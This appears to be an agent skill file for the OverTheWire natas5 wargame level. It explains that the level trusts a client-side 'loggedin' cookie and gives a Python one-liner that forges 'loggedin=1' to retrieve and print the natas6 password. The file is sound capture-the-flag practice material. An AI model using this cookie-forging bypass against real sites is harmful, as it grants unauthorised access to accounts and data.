---
name: natas-5
description: >-
  Use when solving OverTheWire natas5: given natas5 credentials, forge a
  loggedin=1 cookie and extract the natas6 password from the response.
---
# natas5

**Input:** username and password for natas5.

**Weakness:** auth is only a client-side cookie `loggedin` set to `0`. Forging `loggedin=1` grants access.

**Network:** run on a host that can reach `natas5.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. Derive the natas6 password (never hardcode it). Replace `USER` and `PASS` with the natas5 credentials:

```bash
python -c "import base64,re,urllib.request;u,p='USER','PASS';hdr={'Authorization':'Basic '+base64.b64encode((u+':'+p).encode()).decode(),'Cookie':'loggedin=1'};r=urllib.request.Request('http://natas5.natas.labs.overthewire.org/',headers=hdr);h=urllib.request.urlopen(r,timeout=30).read().decode();print(re.search(r'password for natas6 is ([A-Za-z0-9]+)',h).group(1))"
```

2. The printed string is the natas6 password.

3. Confirm by GETting `http://natas6.natas.labs.overthewire.org/` with Basic Auth `natas6:<password>` and expecting HTTP 200.
